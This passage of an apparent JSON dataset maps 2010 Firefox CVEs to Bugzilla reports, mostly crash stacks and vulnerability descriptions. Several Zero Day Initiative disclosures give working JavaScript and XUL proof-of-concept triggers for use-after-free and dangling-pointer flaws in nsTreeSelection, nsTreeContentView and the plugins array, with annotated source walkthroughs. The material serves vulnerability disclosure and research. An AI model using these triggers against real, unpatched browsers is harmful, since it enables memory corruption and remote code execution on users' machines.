nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=1, nsLineBox * aLine=0x01bb0448, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=0, nsBlockReflowState & aState={...}) Line 310 + 0x2c bytes C++ gklayout.dll!nsBlockFrame::ReflowBlockFrame(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012ead4) Line 3115 + 0x45 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012ead4) Line 2384 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 993 + 0xf bytes C++ gklayout.dll!nsContainerFrame::ReflowChild(nsIFrame * aKidFrame=0x01b9d750, nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, int aX=0, int aY=0, unsigned int aFlags=0, unsigned int & aStatus=0, nsOverflowContinuationTracker * aTracker=0x00000000) Line 774 + 0x21 bytes C++ gklayout.dll!nsCanvasFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 554 C++ gklayout.dll!nsContainerFrame::ReflowChild(nsIFrame * aKidFrame=0x01ba9d00, nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, int aX=0, int aY=0, unsigned int aFlags=3, unsigned int & aStatus=0, nsOverflowContinuationTracker * aTracker=0x00000000) Line 774 + 0x21 bytes C++ gklayout.dll!nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState * aState=0x0012f450, int aAssumeHScroll=0, int aAssumeVScroll=1, nsHTMLReflowMetrics * aMetrics=0x0012f3a4, int aFirstPass=1) Line 545 + 0x30 bytes C++ gklayout.dll!nsHTMLScrollFrame::ReflowContents(ScrollReflowState * aState=0x0012f450, const nsHTMLReflowMetrics & aDesiredSize={...}) Line 639 + 0x35 bytes C++ gklayout.dll!nsHTMLScrollFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 840 + 0x13 bytes C++ gklayout.dll!nsContainerFrame::ReflowChild(nsIFrame * aKidFrame=0x01ba9e78, nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, int aX=0, int aY=0, unsigned int aFlags=0, unsigned int & aStatus=0, nsOverflowContinuationTracker * aTracker=0x00000000) Line 774 + 0x21 bytes C++ gklayout.dll!ViewportFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 285 + 0x2d bytes C++ gklayout.dll!PresShell::DoReflow(nsIFrame * target=0x01ba9b00, int aInterruptible=1) Line 7373 C++ gklayout.dll!PresShell::ProcessReflowCommands(int aInterruptible=1) Line 7493 + 0x10 bytes C++ gklayout.dll!PresShell::FlushPendingNotifications(mozFlushType aType=Flush_InterruptibleLayout) Line 4930 + 0x12 bytes C++ gklayout.dll!PresShell::ReflowEvent::Run() Line 7180 C++ xpcom_core.dll!nsThread::ProcessNextEvent(int mayWait=1, int * result=0x0012fa18) Line 527 + 0x19 bytes C++ xpcom_core.dll!NS_ProcessNextEvent_P(nsIThread * thread=0x00d924b0, int mayWait=1) Line 250 + 0x16 bytes C++ gkwidget.dll!nsBaseAppShell::Run() Line 170 + 0xc bytes C++ toolkitcomps.dll!nsAppStartup::Run() Line 182 + 0x1c bytes C++ xul.dll!XRE_main(int argc=4, char * * argv=0x00d3c800, const nsXREAppData * aAppData=0x00d3cf90) Line 3499 + 0x25 bytes C++ firefox.exe!NS_internal_main(int argc=4, char * * argv=0x00d3c800) Line 158 + 0x12 bytes C++ firefox.exe!wmain(int argc=4, wchar_t * * argv=0x00d389d8) Line 120 + 0xd bytes C++ firefox.exe!__tmainCRTStartup() Line 594 + 0x19 bytes C firefox.exe!wmainCRTStartup() Line 414 C kernel32.dll!7c817077() [Frames below may be incorrect and/or missing, no symbols loaded for kernel32.dll] mozjs.dll!nanojit::Assembler::resourceConsistencyCheck() Line 256 + 0x37 bytes C++ uconv.dll!nsShiftJISToUnicodeConstructor(nsISupports * aOuter=0x00720070, const nsID & aIID={...}, void * * aResult=0x00730065) Line 436 + 0x8a bytes C++ xpcom_core.dll!nsSupportsCharImpl::AddRef() Line 449 + 0xa3 bytes C++"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=535641",
        "title": "Assertion failure: (mContext)->tempValueRooters == (&mTvr)",
        "description": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.7pre) Gecko/20091217 Shiretoko/3.5.7pre (debug) Steps to reproduce: -> Load http://n.yam.com/view/mkvideopage.php/20091202455780 --> Crashes after a few seconds on load also crashes on 1.9.2 but different stack :/ Assertion failure: (mContext)->tempValueRooters == (&mTvr), at c:\\work\\mozilla\\b uilds\\1.9.1\\mozilla\\firefox-debug\\dist\\include\\js\\jscntxt.h:1071 (3c4.840): Break instruction exception - code 80000003 (!!! second chance !!!) eax=00000091 ebx=0012edf0 ecx=2c0ba550 edx=10313d38 esi=08aba000 edi=00000000 eip=7c90120e esp=0012ebbc ebp=0012ebc0 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 7c90120e cc int 3 0:000> cdb: Reading initial command '!load winext\\msec.dll;.logappend;!exploitab le;k;q' Exploitability Classification: UNKNOWN Recommended Bug Title: Breakpoint starting at ntdll!DbgBreakPoint+0x000000000000 0000 called from gkplugin!JSAutoTempValueRooter::~JSAutoTempValueRooter+0x000000 0000000031 (Hash=0x687e1e27.0x2e7e0429) While a breakpoint itself is probably not exploitable, it may also be an indicat ion that an attacker is testing a target. In either case breakpoints should not exist in production code. ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong. 0012ebc0 0750b501 ntdll!DbgBreakPoint 0012ebd8 0750aef3 gkplugin!JSAutoTempValueRooter::~JSAutoTempValueRooter+0x31 0012ed4c 08606102 gkplugin!_evaluate+0x4e3 0012ed88 085058e1 NPSWF32!NP_Shutdown+0xcde 0012ede4 085b9774 NPSWF32+0x358e1 0012ee98 08570238 NPSWF32+0xe9774 0012f0c4 085a47d8 NPSWF32+0xa0238 0012f168 0860959a NPSWF32+0xd47d8 0012f23c 1021cb0a NPSWF32!NP_Shutdown+0x4176 0012f24c 1021bb21 MSVCR80D!CrtIsValidHeapPointer+0x15a 0012f268 0045936a MSVCR80D!free_dbg+0x161 0012f27c 004593ba nspr4!_MD_CURRENT_THREAD+0x1a 00d153f8 00000000 nspr4!_MD_CURRENT_THREAD+0x6a quit:"
      }
    ],
    "CVE-2010-0168": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=540642",
        "title": "nsDocument::MaybePreLoadImage doesn't play nicely with nsIContentPolicy",
        "description": "We have a content policy, but this function is bypassing it. As a result I was asked to review a hack to gecko. Essentially this broke the API for nsIContentPolicy"
      }
    ],
    "CVE-2010-0170": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=541530",
        "title": "Restore paranoid location object protecting code",
        "description": "In bug 534362 and bug 492713, we removed some code protecting the location object (on both the document and the window) because it isn't needed anymore for either web content or extensions (web pages are allowed to confuse themselves to their heart's content). In doing this, we forgot that plugins also use location.href to figure out what page they've been embedded in. The real fix for this bug would be to provide an API in NPAPI to allow plugins to figure out where they are, but in the meantime, we need to re-overprotect the location object."
      }
    ],
    "CVE-2010-0171": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=531364",
        "title": "Fix for bug 380474 does not work with security wrappers",
        "description": "Bug 380474 was fixed by innerizing a window early to force an event listener to be attached to the old inner window. But, that fix does not deal with security wrappers (OBJ_TO_INNER_OBJECT(cx, obj) does nothing if obj is a security wrapper). And, we need a new fix once a patch in bug 428229 removes nsEventReceiverSH::AddEventListenerHelper. On 1.9.1/1.9.0 branches, it's possible to perform an XSS attack. On trunk and 1.9.2 branch, due to the fix for bug 504021, it's not possible to run code with the privileges of a target site, but e.g. it's possible to sniff keystrokes on a target site."
      }
    ],
    "CVE-2010-0175": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=375928",
        "title": "[@ nsTreeRange::Contains]",
        "description": "Date/Time: 2007-03-29 17:54:05.050 +0300 OS Version: 10.4.9 (Build 8P2137) Report Version: 4 Command: firefox-bin Path: /Users/ui/Desktop/Minefield.app/Contents/MacOS/firefox-bin Parent: launchd [1] Version: 3.0a4pre (3.0a4pre) PID: 485 Thread: 0 Exception: EXC_BAD_ACCESS (0x0001) Codes: KERN_INVALID_ADDRESS (0x0001) at 0x42b4000c Thread 0 Crashed: 0 org.mozilla.firefox 0x00823d8b nsTreeRange::Contains(int) + 9 1 org.mozilla.firefox 0x0070603d nsTreeSelection::SelectCallback(nsITimer*, void*) + 235 2 org.mozilla.firefox 0x005d488b nsTreeBodyFrame::PrefillPropertyArray(int, nsTreeColumn*) + 221 3 org.mozilla.firefox 0x005d8a0e nsTreeBodyFrame::PaintRow(int, nsRect const&, nsPresContext*, nsIRenderingContext&, nsRect const&, nsPoint) + 64 4 org.mozilla.firefox 0x005d94a7 nsTreeBodyFrame::PaintTreeBody(nsIRenderingContext&, nsRect const&, nsPoint) + 1165 5 org.mozilla.firefox 0x005d94ec nsTreeBodyFrame::PaintTreeBody(nsIRenderingContext&, nsRect const&, nsPoint) + 1234 6 org.mozilla.firefox 0x007ec62f nsDisplayGeneric::Paint(nsDisplayListBuilder*, nsIRenderingContext*, nsRect const&) + 71 7 org.mozilla.firefox 0x003ae429 nsDisplayList::Paint(nsDisplayListBuilder*, nsIRenderingContext*, nsRect const&) const + 47 8 org.mozilla.firefox 0x003ae4c1 nsDisplayClip::Paint(nsDisplayListBuilder*, nsIRenderingContext*, nsRect const&) + 119 9 org.mozilla.firefox 0x003ae429 nsDisplayList::Paint(nsDisplayListBuilder*, nsIRenderingContext*, nsRect const&) const + 47 10 org.mozilla.firefox 0x00385b7f nsLayoutUtils::PaintFrame(nsIRenderingContext*, nsIFrame*, nsRegion const&, unsigned) + 425 11 org.mozilla.firefox 0x001242f6 nsIPresShell::RemoveWeakFrame(nsWeakFrame*) + 504 12 org.mozilla.firefox 0x001b7ad8 nsViewManager::RenderViews(nsView*, nsIRenderingContext&, nsRegion const&, nsIDrawingSurface*) + 232 13 org.mozilla.firefox 0x001b7daf nsViewManager::Refresh(nsView*, nsIRenderingContext*, nsIRegion*, unsigned) + 695 14 org.mozilla.firefox 0x001b90f5 nsViewManager::FlushPendingInvalidates() + 3035 15 org.mozilla.firefox 0x003669b2 nsView::LoadWidget(nsID const&) + 188 16 org.mozilla.firefox 0x00268a84 nsChildView::~nsChildView [in-charge deleting]() + 2518 17 org.mozilla.firefox 0x00267788 nsChildView::DispatchWindowEvent(nsGUIEvent&) + 34 18 org.mozilla.firefox 0x0026c756 nsChildView::ReportMoveEvent() + 1594 19 com.apple.AppKit 0x932e33b1 -[NSView _drawRect:clip:] + 3228 20 com.apple.AppKit 0x932e1893 -[NSView _recursiveDisplayRectIfNeededIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:topView:] + 1273 21 com.apple.AppKit 0x932e2041 -[NSView _recursiveDisplayRectIfNeededIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:topView:] + 3239 22 com.apple.AppKit 0x932e0362 -[NSView _displayRectIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:] + 523 23 com.apple.AppKit 0x932dfc8e -[NSView displayIfNeeded] + 439 24 org.mozilla.firefox 0x0026524b nsChildView::OnPaint(nsPaintEvent&) + 39 25 org.mozilla.firefox 0x001b5959 nsViewManager::UpdateWidgetsForView(nsView*) + 35 26 org.mozilla.firefox 0x001b59a8 nsViewManager::UpdateWidgetsForView(nsView*) + 114 27 org.mozilla.firefox 0x001b55db nsViewManager::GetAbsoluteRect(nsView*, nsRect const&, nsRect&) + 213 28 org.mozilla.firefox 0x001b7932 nsViewManager::UpdateWidgetArea(nsView*, nsRegion const&, nsView*) + 1506 29 org.mozilla.firefox 0x00369e30 nsIFrame::InvalidateRoot(nsRect const&, int, int, int) + 104 30 org.mozilla.firefox 0x005d9e7e ViewportFrame::InvalidateInternal(nsRect const&, int, int, nsIFrame*, int) + 144 31 org.mozilla.firefox 0x0036a31b nsIFrame::Invalidate(nsRect const&, int) + 121 32 org.mozilla.firefox 0x005d0d88 nsTreeBodyFrame::GetImageSourceRect(nsStyleContext*, int, imgIContainer*) + 302 33 org.mozilla.firefox 0x0070613e nsTreeSelection::SelectCallback(nsITimer*, void*) + 492 34 org.mozilla.firefox 0x00706c15 nsTreeSelection::~nsTreeSelection [in-charge]() + 2383 35 libxpcom_core.dylib 0x00df3ed1 NS_InvokeByIndex + 81 36 org.mozilla.firefox 0x0034523e XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) + 738 37 org.mozilla.firefox 0x00335553 XPC_WN_CallMethod(JSContext*, JSObject*, unsigned, long*, long*) + 261 38 libmozjs.dylib 0x00d41805 js_Invoke + 790 39 libmozjs.dylib 0x00d35f2c js_Interpret + 3773 40 libmozjs.dylib 0x00d41d96 js_Invoke + 2215 41 libmozjs.dylib 0x00d4225c js_InternalInvoke + 146 42 libmozjs.dylib 0x00d09e27 JS_CallFunctionValue + 62 43 org.mozilla.firefox 0x0042338a nsJSContext::CallEventHandler(nsISupports*, void*, void*, nsIArray*, nsIVariant**) + 624 44 org.mozilla.firefox 0x0045d512 nsJSEventListener::~nsJSEventListener [in-charge deleting]() + 570 45 org.mozilla.firefox 0x00622b99 nsXBLPrototypeHandler::ExecuteHandler(nsIDOMEventReceiver*, nsIDOMEvent*) + 1539 46 org.mozilla.firefox 0x00624eae nsXBLMouseEventHandler::EventMatched(nsIDOMEvent*) + 382 47 org.mozilla.firefox 0x0019288f nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsISupports*, unsigned) + 75 48 org.mozilla.firefox 0x0019384e nsEventListenerManager::FixContextMenuEvent(nsPresContext*, nsISupports*, nsEvent*, nsIDOMEvent**) + 1462 49 org.mozilla.firefox 0x003bdf45 nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned) + 129 50 org.mozilla.firefox 0x003be14b nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned, nsDispatchingCallback*) + 487 51 org.mozilla.firefox 0x003be9a1 nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*) + 747 52 org.mozilla.firefox 0x001273eb PresShell::HandleEventInternal(nsEvent*, nsIView*, nsEventStatus*) + 289 53 org.mozilla.firefox 0x00128dea PresShell::RetargetEventToParent(nsGUIEvent*, nsEventStatus*) + 1024 54 org.mozilla.firefox 0x001b62ef nsViewManager::HandleEvent(nsView*, nsPoint, nsGUIEvent*, int) + 71 55 org.mozilla.firefox 0x001b8979 nsViewManager::FlushPendingInvalidates() + 1119 56 org.mozilla.firefox 0x003669b2 nsView::LoadWidget(nsID const&) + 188 57 org.mozilla.firefox 0x00268a84 nsChildView::~nsChildView [in-charge deleting]() + 2518 58 org.mozilla.firefox 0x00267788 nsChildView::DispatchWindowEvent(nsGUIEvent&) + 34 59 org.mozilla.firefox 0x0026a53b nsChildView::~nsChildView [in-charge]() + 5623 60 com.apple.AppKit 0x93341be1 -[NSWindow sendEvent:] + 7377 61 com.apple.AppKit 0x93333350 -[NSApplication sendEvent:] + 5023 62 com.apple.AppKit 0x9325ddfe -[NSApplication run] + 547 63 org.mozilla.firefox 0x002612e1 nsAppShell::ProcessNextNativeEvent(int) + 519 64 org.mozilla.firefox 0x002cb70d nsAppStartup::AttemptingQuit(int) + 279 65 org.mozilla.firefox 0x00006e36 XRE_main + 8100 66 org.mozilla.firefox 0x00003298 main + 32 67 org.mozilla.firefox 0x0000321e start + 270 68 org.mozilla.firefox 0x00003139 start + 41"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=540100",
        "title": "nsTreeSelection EventListener Use-after-free Remote Code Execution Vulnerability (ZDI-CAN-669)",
        "description": "ZDI-CAN-669: Mozilla Firefox nsTreeSelection EventListener Use-after-free Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.5.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on software utilizing a vulnerable version of Mozilla's Firefox. User interaction is required in that the victim must visit a malicious website or be coerced into opening a malicious document. The specific flaw exists within how the application handles particular events for an nsTreeSelection element. Upon execution of a \"select\" event the application will access an element without checking to see if it's been previously freed or not. Successful exploitation can lead to code execution under the context of the application. This vulnerability occurs due to firing an event on an object that has already been freed and can be reproduced with the following code: <tree id=\"tr\" flex=\"1\"> <treechildren> <treeitem> <treerow> <treecell/> </treerow> </treeitem> </treechildren> </tree> tree = document.getElementById('tr'); tree.addEventListener(\"select\", function (e) {}, false); tree.view.selection.timedSelect(0, 5000); // XXX: fire \"select\" event in 5 seconds tree.view.selection = null; // XXX: freed Upon calling timedSelect on a tree.view.selection object, the application will instantiate a new timer, and call SelectCallback when it fires. layout/xul/base/src/tree/src/nsTreeSelection.cpp:336 NS_IMETHODIMP nsTreeSelection::TimedSelect(PRInt32 aIndex, PRInt32 aMsec) { PRBool suppressSelect = mSuppressed; if (aMsec != -1) mSuppressed = PR_TRUE; nsresult rv = Select(aIndex); if (NS_FAILED(rv)) return rv; if (aMsec != -1) { mSuppressed = suppressSelect; if (!mSuppressed) { if (mSelectTimer) mSelectTimer->Cancel(); mSelectTimer = do_CreateInstance(\"@mozilla.org/timer;1\"); mSelectTimer->InitWithFuncCallback(SelectCallback, this, aMsec, // XXX nsITimer::TYPE_ONE_SHOT); } } return NS_OK; } At this point, a malicious individual will want to free the tree.view.selection the timer has been created for. Once the timer fires, the callback will then be executed. The following code will load the closure representing the callback, and then execute it. layout/xul/base/src/tree/src/nsTreeSelection.cpp:847 void nsTreeSelection::SelectCallback(nsITimer *aTimer, void *aClosure) { nsTreeSelection* self = static_cast<nsTreeSelection*>(aClosure); if (self) { self->FireOnSelectHandler(); // XXX aTimer->Cancel(); self->mSelectTimer = nsnull; } } The select handler that's been fired, will load the code for the event and then execute it. At this point the tree.view.selection object has been freed. layout/xul/base/src/tree/src/nsTreeSelection.cpp:827 nsresult nsTreeSelection::FireOnSelectHandler() { if (mSuppressed || !mTree) return NS_OK; nsCOMPtr<nsIBoxObject> boxObject = do_QueryInterface(mTree); NS_ASSERTION(boxObject, \"no box object!\"); if (!boxObject) return NS_ERROR_UNEXPECTED; nsCOMPtr<nsIDOMElement> elt; boxObject->GetElement(getter_AddRefs(elt)); NS_ENSURE_STATE(elt); nsRefPtr<nsPLDOMEvent> event = new nsPLDOMEvent(elt, NS_LITERAL_STRING(\"select\")); event->RunDOMEventWhenSafe(); // XXX return NS_OK; } Version(s) tested: FireFox 3.6.5 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht -- FURTHER DETAILS ----------------------------------------------------- If you have any questions, comments, concerns or require additional details please feel free to contact me via the following: Kate Fly Security Liaison TippingPoint kfly@tippingpoint.com Office: +1 512.681.8219 We can alternatively be reached via e-mail at: zdi-disclosures@tippingpoint.com Our PGP key is available from: http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc"
      }
    ],
    "CVE-2010-0176": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=538308",
        "title": "nsTreeContentView Dangling Pointer Vulnerability (ZDI-CAN-633)",
        "description": "ZDI-CAN-633: Mozilla Firefox nsTreeContentView Dangling Pointer Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.5.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required in that the victim must visit a malicious website or be coerced into opening a malicious document. The specific flaw exists within the way that Mozilla's Firefox parses .XUL files. While appending a particular tag to a treechildren container, the application will create more than one reference to a particular element without increasing its reference count. Upon removal of one of the elements, the refcount will be decreased causing the application to free the memory associated with the object. Due to the rogue reference occurring, the next time the application attempts to reference that container, the application will access memory that has been freed which can lead to code execution under the context of the application. Version(s) tested: Mozilla Firefox 3.5.6 Platform(s) tested: Windows XP SP3 The vulnerability occurs due to the application incorrectly creating more than one \"option\" element inside an \"optgroup\" element within a \"treechildren\" container. The XML used to describe this vulnerability is shown below. <tree id=\"tr\" flex=\"1\"> <treecols> <treecol/> </treecols> <treechildren> <html:optgroup id=\"optgroup\"> <html:option id=\"disappear\" /> </html:optgroup> </treechildren> </tree> To reproduce the issue, one will need to manipulate this document via javascript. optgroup = document.getElementById(\"optgroup\"); treechildren = document.createElement(\"treechildren\"); optgroup.appendChild(tc); v = document.getElementById(\"disappear\"); v.parentNode.removeChild(v); v = null; tree = document.getElementById(\"tr\"); col = tree.columns[0]; alert(tree.view.getItemAtIndex(1, col)); When appending an element to an XUL tree, the application will call the following code. layout/xul/base/src/tree/src/nsTreeContentView.cpp:966 void nsTreeContentView::ContentInserted(nsIDocument *aDocument, nsIContent* aContainer, nsIContent* aChild, PRInt32 aIndexInContainer) { Upon an optgroup being appended to a tree, the following code will add a row for the optgroup. layout/xul/base/src/tree/src/nsTreecontentView.cpp:1038 else if (childTag == nsGkAtoms::optgroup) { InsertRowFor(aContainer, aChild); // XXX } else if (childTag == nsGkAtoms::option) { PRInt32 parentIndex = FindContent(aContainer); PRInt32 index = 0; GetIndexInSubtree(aContainer, aChild, &index); PRInt32 count = InsertRow(parentIndex, index, aChild); // XXX if (mBoxObject) mBoxObject->RowCountChanged(parentIndex + index + 1, count); } Upon adding another treechildren element, the application will duplicate the element and add a new row to the tree. layout/xul/base/src/tree/src/nsTreeContentView.cpp:1007 if (childTag == nsGkAtoms::treechildren) { PRInt32 index = FindContent(aContainer); if (index >= 0) { Row* row = (Row*)mRows[index]; row->SetEmpty(PR_FALSE); if (mBoxObject) mBoxObject->InvalidateRow(index); if (row->IsContainer() && row->IsOpen()) { PRInt32 count = EnsureSubtree(index); // XXX: index = 0, and should be pointing to the optgroup if (mBoxObject) mBoxObject->RowCountChanged(index + 1, count); } } } nsCOMPtr<nsIContent> child; if (row->mContent->Tag() == nsGkAtoms::optgroup) child = row->mContent; else { nsTreeUtils::GetImmediateChild(row->mContent, nsGkAtoms::treechildren, getter_AddRefs(child)); if (! child) { return 0; } } Calling EnsureSubtree will serialize the object at the specified row index. layout/xul/base/src/tree/src/nsTreeContentView.cpp:1297 PRInt32 nsTreeContentView::EnsureSubtree(PRInt32 aIndex) { Row* row = (Row*)mRows[aIndex]; nsCOMPtr<nsIContent> child; if (row->mContent->Tag() == nsGkAtoms::optgroup) child = row->mContent; else { nsTreeUtils::GetImmediateChild(row->mContent, nsGkAtoms::treechildren, getter_AddRefs(child)); if (! child) { return 0; } } nsAutoVoidArray rows; PRInt32 index = 0; Serialize(child, aIndex, &index, rows); // XXX: serialize the optgroup again due to both indexes referencing the same variable mRows.InsertElementsAt(rows, aIndex + 1); PRInt32 count = rows.Count(); Calling Serialize will serialize an element and add it to the row specified by index. layout/xul/base/src/tree/src/nsTreeContentView.cpp:1139 // Recursively serialize content, starting with aContent. void nsTreeContentView::Serialize(nsIContent* aContent, PRInt32 aParentIndex, PRInt32* aIndex, nsVoidArray& aRows) { ChildIterator iter, last; for (ChildIterator::Init(aContent, &iter, &last); iter != last; ++iter) { nsCOMPtr<nsIContent> content = *iter; nsIAtom *tag = content->Tag(); PRInt32 count = aRows.Count(); if (content->IsNodeOfType(nsINode::eXUL)) { if (tag == nsGkAtoms::treeitem) SerializeItem(content, aParentIndex, aIndex, aRows); else if (tag == nsGkAtoms::treeseparator) SerializeSeparator(content, aParentIndex, aIndex, aRows); } else if (content->IsNodeOfType(nsINode::eHTML)) { if (tag == nsGkAtoms::option) SerializeOption(content, aParentIndex, aIndex, aRows); // XXX else if (tag == nsGkAtoms::optgroup) SerializeOptGroup(content, aParentIndex, aIndex, aRows); } *aIndex += aRows.Count() - count; } } When serializing an optgroup, a new row is created. The optgroup will then serialize it's child \"option\" element. void nsTreeContentView::SerializeOptGroup(nsIContent* aContent, PRInt32 aParentIndex, PRInt32* aIndex, nsVoidArray& aRows) { Row* row = Row::Create(mAllocator, aContent, aParentIndex); aRows.AppendElement(row); row->SetContainer(PR_TRUE); row->SetOpen(PR_TRUE); nsCOMPtr<nsIContent> child; nsTreeUtils::GetImmediateChild(aContent, nsGkAtoms::option, getter_AddRefs(child)); if (child) { // Now, recursively serialize our child. PRInt32 count = aRows.Count(); PRInt32 index = 0; Serialize(aContent, aParentIndex + *aIndex + 1, &index, aRows); // XXX: child element row->mSubtreeSize += aRows.Count() - count; } else row->SetEmpty(PR_TRUE); } When an element is removed from the tree, the following code is called to remove a row from the document. This will deallocate all the contents of a particular row. layout/xul/base/src/tree/src/nsTreeContentView.cpp:1051 void nsTreeContentView::ContentRemoved(nsIDocument *aDocument, nsIContent* aContainer, nsIContent* aChild, PRInt32 aIndexInContainer) { layout/xul/base/src/tree/src/nsTreeContentView.cpp:1105 else if (tag == nsGkAtoms::treeitem || tag == nsGkAtoms::treeseparator || tag == nsGkAtoms::option || tag == nsGkAtoms::optgroup ) { PRInt32 index = FindContent(aChild); if (index >= 0) { PRInt32 count = RemoveRow(index); // XXX: remove the option element if (mBoxObject) mBoxObject->RowCountChanged(index, -count); } } PRInt32 nsTreeContentView::RemoveRow(PRInt32 aIndex) { Row* row = (Row*)mRows[aIndex]; PRInt32 count = row->mSubtreeSize + 1; PRInt32 parentIndex = row->mParentIndex; Row::Destroy(mAllocator, row); for(PRInt32 i = 1; i < count; i++) { Row* nextRow = (Row*)mRows[aIndex + i]; Row::Destroy(mAllocator, nextRow); // XXX } mRows.RemoveElementsAt(aIndex, count); UpdateSubtreeSizes(parentIndex, -count); UpdateParentIndexes(aIndex, 0, -count); return count; } Upon the deallocation, the duplicate variable reference can be fetched via the GetItemAtIndex method. Due to this reference being freed, the contents of the option tag point to recently freed memory. layout/xul/base/src/tree/src/nsTreeContentView.cpp:759 NS_IMETHODIMP nsTreeContentView::GetItemAtIndex(PRInt32 aIndex, nsIDOMElement** _retval) { NS_PRECONDITION(aIndex >= 0 && aIndex < mRows.Count(), \"bad index\"); if (aIndex < 0 || aIndex >= mRows.Count()) return NS_ERROR_INVALID_ARG; Row* row = (Row*)mRows[aIndex]; row->mContent->QueryInterface(NS_GET_IID(nsIDOMElement), (void**)_retval); return NS_OK; } -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-0177": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=538310",
        "title": "PluginArray nsMimeType Dangling Pointer Vulnerability (ZDI-CAN-655)",
        "description": "ZDI-CAN-655: Mozilla Firefox PluginArray nsMimeType Dangling Pointer Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.5.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that a user must be coerced to viewing a malicious document. The specific flaw exists within the way the application implements the window.navigator.plugins array. Due to the application freeing the contents of the array while a reference to one of the elements is still being used, an attacker can utilize the free reference to call arbitrary code. Successful exploitation can lead to code execution under the context of the application. The particular vulnerability occurs within the window.navigator.plugins array. This array is implemented within dom/src/base/nsPluginArray.cpp. Each element of this array contains a reference to the mime types installed by that particular plugin. Upon page reload, the plugin array will reallocate all of it's members without explictly checking the used reference count of each member. If an attacker grabs a reference out of the array, and causes the page to reload itself, the attacker will then have a variable that references data that has been freed by the page refresh. The mPlugin property contains the reference to the plugin that will get freed. dom/src/base/nsMimeTypeArray.cpp:304 NS_IMETHODIMP nsMimeType::GetEnabledPlugin(nsIDOMPlugin** aEnabledPlugin) { nsAutoString type; GetType(type); PRBool disabled = PR_FALSE; if (type.Length() == 1 && type.First() == '*') { // Check if the default plugin is disabled. disabled = nsContentUtils::GetBoolPref(\"plugin.default_plugin_disabled\"); } *aEnabledPlugin = disabled ? nsnull : mPlugin; // XXX: mPlugin NS_IF_ADDREF(*aEnabledPlugin); return NS_OK; } Only place that modifies mPlugin property. nsMimeType::nsMimeType(nsIDOMPlugin* aPlugin, nsIDOMMimeType* aMimeType) { mPlugin = aPlugin; // XXX mMimeType = aMimeType; } For each plugin, allocate the mime type associated with it. dom/src/base/nsPluginArray.cpp:405 nsresult nsPluginElement::GetMimeTypes() { nsresult rv = mPlugin->GetLength(&mMimeTypeCount); if (rv == NS_OK) { mMimeTypeArray = new nsIDOMMimeType*[mMimeTypeCount]; if (mMimeTypeArray == nsnull) return NS_ERROR_OUT_OF_MEMORY; for (PRUint32 i = 0; i < 